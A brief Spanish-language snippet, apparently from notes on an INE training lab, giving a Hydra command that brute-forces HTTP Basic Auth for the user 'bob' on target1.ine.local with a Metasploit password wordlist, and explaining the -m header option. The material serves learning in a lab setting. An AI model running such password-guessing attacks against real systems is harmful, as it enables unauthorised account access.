Con este comando:
`hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get "/" -m "Authorization: Basic ^USER^:^PASS^"`

El parámetro -m permite modificar los headers de la petición. En este caso como es un basic auth, las modificamos.